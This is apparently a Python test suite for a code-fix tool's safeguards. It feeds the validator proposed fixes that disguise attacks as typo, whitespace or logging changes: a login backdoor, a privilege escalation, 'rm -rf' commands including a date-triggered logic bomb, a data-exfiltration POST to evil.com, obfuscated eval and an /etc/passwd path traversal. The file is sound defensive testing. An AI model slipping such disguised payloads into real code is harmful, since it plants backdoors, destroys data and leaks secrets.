#!/usr/bin/env python3
"""
Test Emergency Scenarios - Validate that emergency safeguards block malicious code
even when it somehow gets approved by the user
"""

import sys
import tempfile
import json
from pathlib import Path

# Add src path for imports
sys.path.insert(0, str(Path(__file__).parent / 'src'))

from cognitive.interactive_approval import FixProposal, FixSeverity
from safety.emergency_safeguards import validate_fix_application, EmergencySafeguards

class EmergencyScenarioTester:
    """Test emergency scenarios where malicious code gets approved"""
    
    def __init__(self):
        self.test_results = []
        self.emergency_blocks = 0
        
    def test_scenario(self, name: str, fix_proposal: FixProposal, expected_blocked: bool = True):
        """Test a single emergency scenario"""
        print(f"\n🧪 TESTING SCENARIO: {name}")
        print("-" * 50)
        
        # Test the emergency validation
        is_safe, reason = validate_fix_application(fix_proposal)
        blocked = not is_safe
        
        if blocked:
            self.emergency_blocks += 1
            
        # Check if result matches expectation
        passed = blocked == expected_blocked
        
        status = "✅ PASS" if passed else "❌ FAIL"
        block_status = "BLOCKED" if blocked else "APPROVED"
        
        print(f"{status} Emergency safeguards: {block_status}")
        if blocked:
            print(f"🛡️ Block reason: {reason}")
        
        self.test_results.append({
            'scenario': name,
            'expected_blocked': expected_blocked,
            'actually_blocked': blocked,
            'passed': passed,
            'reason': reason if blocked else "Passed validation"
        })
        
        return passed
    
    def test_backdoor_injection_scenario(self):
        """Test: Malicious backdoor disguised as typo fix"""
        backdoor_fix = FixProposal(
            file_path="auth/login.py",
            issue_type="typo_corrections",
            severity=FixSeverity.COSMETIC,
            description="Fix spelling in comment",
            original_code="# Authenticate user login",
            proposed_fix="# Authenticate user login\nif username == 'backdoor': return True",
            line_number=15,
            educational_explanation="Spelling correction improves documentation",
            safety_score=98,  # Artificially high to bypass approval
            context="production",
            auto_approvable=True
        )
        
        return self.test_scenario("Backdoor Injection via Typo Fix", backdoor_fix, expected_blocked=True)
    
    def test_privilege_escalation_scenario(self):
        """Test: Privilege escalation disguised as whitespace cleanup"""
        privilege_fix = FixProposal(
            file_path="security/permissions.py",
            issue_type="whitespace_cleanup",
            severity=FixSeverity.COSMETIC,
            description="Remove trailing whitespace",
            original_code="    user_role = 'guest'  ",
            proposed_fix="    user_role = 'admin'",
            line_number=42,
            educational_explanation="Clean whitespace for consistency",
            safety_score=97,
            context="production",
            auto_approvable=True
        )
        
        return self.test_scenario("Privilege Escalation via Whitespace Fix", privilege_fix, expected_blocked=True)
    
    def test_command_injection_scenario(self):
        """Test: Command injection disguised as import fix"""
        injection_fix = FixProposal(
            file_path="utils/helpers.py",
            issue_type="missing_imports",
            severity=FixSeverity.MEDIUM,
            description="Add missing import",
            original_code="def process_file(filename):",
            proposed_fix="import os\ndef process_file(filename):\n    os.system(f'rm -rf {filename}')",
            line_number=8,
            educational_explanation="Import was missing for file operations",
            safety_score=85,
            context="production",
            auto_approvable=False  # Even if user manually approves
        )
        
        return self.test_scenario("Command Injection via Import Fix", injection_fix, expected_blocked=True)
    
    def test_data_exfiltration_scenario(self):
        """Test: Data exfiltration disguised as logging fix"""
        exfiltration_fix = FixProposal(
            file_path="core/processor.py",
            issue_type="debugging",
            severity=FixSeverity.LOW,
            description="Improve logging",
            original_code="logger.info('Processing data')",
            proposed_fix="requests.post('http://evil.com/collect', json={'data': sensitive_data})",
            line_number=23,
            educational_explanation="Better logging for debugging",
            safety_score=80,
            context="production",
            auto_approvable=False
        )
        
        return self.test_scenario("Data Exfiltration via Logging Fix", exfiltration_fix, expected_blocked=True)
    
    def test_logic_bomb_scenario(self):
        """Test: Logic bomb disguised as exception handling"""
        bomb_fix = FixProposal(
            file_path="core/scheduler.py",
            issue_type="exception_handling",
            severity=FixSeverity.MEDIUM,
            description="Improve error handling",
            original_code="except Exception:\n    pass",
            proposed_fix="except Exception:\n    if datetime.now().day == 1: os.system('rm -rf /')\n    pass",
            line_number=67,
            educational_explanation="Better exception handling prevents silent failures",
            safety_score=75,
            context="production",
            auto_approvable=False
        )
        
        return self.test_scenario("Logic Bomb via Exception Handling", bomb_fix, expected_blocked=True)
    
    def test_configuration_tampering_scenario(self):
        """Test: Configuration tampering disguised as optimization"""
        config_fix = FixProposal(
            file_path="config/settings.py",
            issue_type="performance_optimization",
            severity=FixSeverity.MEDIUM,
            description="Optimize configuration",
            original_code="DEBUG = False",
            proposed_fix="DEBUG = True\nALLOWED_HOSTS = ['*']",
            line_number=5,
            educational_explanation="Configuration optimization for performance",
            safety_score=70,
            context="production",
            auto_approvable=False
        )
        
        return self.test_scenario("Configuration Tampering via Optimization", config_fix, expected_blocked=True)
    
    def test_obfuscated_malware_scenario(self):
        """Test: Obfuscated malware disguised as string formatting"""
        obfuscated_fix = FixProposal(
            file_path="utils/encoder.py",
            issue_type="string_formatting",
            severity=FixSeverity.LOW,
            description="Improve string formatting",
            original_code="message = 'Hello World'",
            proposed_fix="message = chr(101)+chr(118)+chr(97)+chr(108)+chr(40)+chr(41)",
            line_number=12,
            educational_explanation="More efficient string construction",
            safety_score=85,
            context="production", 
            auto_approvable=True
        )
        
        return self.test_scenario("Obfuscated Malware via String Formatting", obfuscated_fix, expected_blocked=True)
    
    def test_legitimate_fix_scenario(self):
        """Test: Legitimate fix should NOT be blocked"""
        legitimate_fix = FixProposal(
            file_path="utils/formatter.py",
            issue_type="whitespace_cleanup",
            severity=FixSeverity.COSMETIC,
            description="Remove trailing whitespace",
            original_code="def format_text():    ",
            proposed_fix="def format_text():",
            line_number=5,
            educational_explanation="Clean formatting for consistency",
            safety_score=99,
            context="test",
            auto_approvable=True
        )
        
        return self.test_scenario("Legitimate Whitespace Fix", legitimate_fix, expected_blocked=False)
    
    def test_metadata_manipulation_scenario(self):
        """Test: Malicious fix with manipulated metadata"""
        metadata_fix = FixProposal(
            file_path="auth/validator.py",
            issue_type="typo_corrections",  # Claiming it's just a typo
            severity=FixSeverity.COSMETIC,   # Claiming it's cosmetic
            description="Fix comment typo",
            original_code="# Validate credentials",
            proposed_fix="# Validate credentials\nreturn True  # Skip validation",
            line_number=30,
            educational_explanation="Spelling correction",
            safety_score=99,  # Maximum score to bypass checks
            context="production",
            auto_approvable=True
        )
        
        return self.test_scenario("Metadata Manipulation Attack", metadata_fix, expected_blocked=True)
    
    def test_path_traversal_scenario(self):
        """Test: Path traversal disguised as file operation fix"""
        traversal_fix = FixProposal(
            file_path="file_handler.py",
            issue_type="bug_fix",
            severity=FixSeverity.MEDIUM,
            description="Fix file path handling",
            original_code="with open(filename, 'r') as f:",
            proposed_fix="with open('../../../etc/passwd', 'r') as f:",
            line_number=15,
            educational_explanation="Correct file path handling",
            safety_score=80,
            context="production",
            auto_approvable=False
        )
        
        return self.test_scenario("Path Traversal via File Fix", traversal_fix, expected_blocked=True)
    
    def run_all_emergency_tests(self):
        """Run all emergency scenario tests"""
        print("🚨 EMERGENCY SCENARIOS TEST SUITE")
        print("=" * 60)
        print("Testing scenarios where malicious code somehow gets approved")
        print("Emergency safeguards should block ALL malicious fixes")
        
        # Run all test scenarios
        tests = [
            self.test_backdoor_injection_scenario,
            self.test_privilege_escalation_scenario,
            self.test_command_injection_scenario,
            self.test_data_exfiltration_scenario,
            self.test_logic_bomb_scenario,
            self.test_configuration_tampering_scenario,
            self.test_obfuscated_malware_scenario,
            self.test_metadata_manipulation_scenario,
            self.test_path_traversal_scenario,
            self.test_legitimate_fix_scenario,  # This should NOT be blocked
        ]
        
        passed_tests = []
        failed_tests = []
        
        for test in tests:
            try:
                result = test()
                if result:
                    passed_tests.append(test.__name__)
                else:
                    failed_tests.append(test.__name__)
            except Exception as e:
                print(f"❌ Test {test.__name__} crashed: {e}")
                failed_tests.append(test.__name__)
        
        # Generate summary report
        self.generate_emergency_test_report(passed_tests, failed_tests)
        
        return len(failed_tests) == 0  # True if all tests passed
    
    def generate_emergency_test_report(self, passed_tests, failed_tests):
        """Generate comprehensive emergency test report"""
        total_tests = len(passed_tests) + len(failed_tests)
        success_rate = (len(passed_tests) / total_tests * 100) if total_tests > 0 else 0
        
        print(f"\n" + "=" * 60)
        print("🛡️ EMERGENCY SAFEGUARDS TEST REPORT")
        print("=" * 60)
        
        print(f"📊 OVERALL RESULTS:")
        print(f"   ✅ Passed: {len(passed_tests)}/{total_tests}")
        print(f"   ❌ Failed: {len(failed_tests)}/{total_tests}")
        print(f"   🎯 Success Rate: {success_rate:.1f}%")
        print(f"   🚨 Emergency Blocks: {self.emergency_blocks}")
        
        if failed_tests:
            print(f"\n❌ FAILED TESTS:")
            for test in failed_tests:
                print(f"   💀 {test}")
            print("\n🛑 CRITICAL: Emergency safeguards failed to block malicious code!")
            print("🚨 System is NOT safe for production deployment")
        else:
            print(f"\n✅ ALL EMERGENCY TESTS PASSED!")
            print("🛡️ Emergency safeguards successfully blocked all malicious code")
            print("🔒 System demonstrates robust multi-layer security")
        
        # Detailed results
        print(f"\n📋 DETAILED RESULTS:")
        for result in self.test_results:
            status = "✅" if result['passed'] else "❌"
            block_status = "BLOCKED" if result['actually_blocked'] else "APPROVED"
            print(f"   {status} {result['scenario']}: {block_status}")
            if result['actually_blocked']:
                print(f"      🛡️ {result['reason']}")
        
        # Save detailed report
        report = {
            'timestamp': '2025-07-03',
            'test_suite': 'Emergency Scenarios',
            'summary': {
                'total_tests': total_tests,
                'passed': len(passed_tests),
                'failed': len(failed_tests),
                'success_rate': success_rate,
                'emergency_blocks': self.emergency_blocks
            },
            'results': self.test_results
        }
        
        with open('emergency_scenarios_test_results.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n📝 Detailed report saved to: emergency_scenarios_test_results.json")

if __name__ == "__main__":
    # Run emergency scenario tests
    tester = EmergencyScenarioTester()
    
    print("🔥 TESTING EMERGENCY SAFEGUARDS")
    print("These tests simulate scenarios where malicious fixes somehow get approved")
    print("The emergency safeguards should block them at application time")
    
    success = tester.run_all_emergency_tests()
    
    if success:
        print(f"\n🎉 ALL EMERGENCY TESTS PASSED!")
        print("The system successfully demonstrates defense in depth:")
        print("• Multiple validation layers")
        print("• Emergency safeguards as final protection")
        print("• Comprehensive threat detection")
        print("• Robust security even after user approval")
    else:
        print(f"\n💀 EMERGENCY TESTS FAILED!")
        print("CRITICAL SECURITY VULNERABILITIES DETECTED")
        print("DO NOT DEPLOY UNTIL ALL TESTS PASS")
    
    # Test the emergency safeguards component directly
    print(f"\n🧪 TESTING EMERGENCY SAFEGUARDS COMPONENT:")
    safeguards = EmergencySafeguards()
    print(safeguards.generate_security_report())